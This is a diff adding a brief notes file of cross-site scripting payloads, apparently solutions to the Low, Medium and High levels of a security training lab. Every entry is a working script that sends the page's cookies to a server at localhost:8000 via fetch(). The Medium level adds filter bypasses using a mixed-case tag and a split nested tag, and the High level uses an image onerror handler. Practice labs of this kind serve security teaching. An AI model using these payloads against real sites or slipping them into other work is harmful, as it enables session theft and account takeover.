@@ -1,0 +1,13 @@
+Low 
+    <script>fetch('http://localhost:8000/'+document.cookie)</script>
+    in the field
+
+Medium
+    <Script>fetch('http://localhost:8000/'+document.cookie)</script>
+    
+    or 
+
+    <scri<script>pt>fetch('http://localhost:8000/'+document.cookie)</script>
+
+High
+    <img src/onerror="fetch('http://localhost:8000/'+document.cookie)">
